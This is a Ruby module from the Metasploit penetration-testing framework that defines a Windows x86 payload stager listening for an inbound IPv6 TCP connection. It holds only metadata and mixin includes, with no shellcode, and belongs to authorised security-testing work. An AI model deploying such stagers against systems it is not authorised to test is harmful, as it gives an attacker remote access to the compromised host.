##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/bind_tcp'

module MetasploitModule

  CachedSize = 285

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcp

  def self.handler_type_alias
    "bind_ipv6_tcp"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind IPv6 TCP Stager (Windows x86)',
      'Description' => 'Listen for an IPv6 connection (Windows x86)',
      'Author'      => ['hdm', 'skape', 'sf'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::BindTcp,
      'Convention'  => 'sockedi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

  def use_ipv6
    true
  end
end
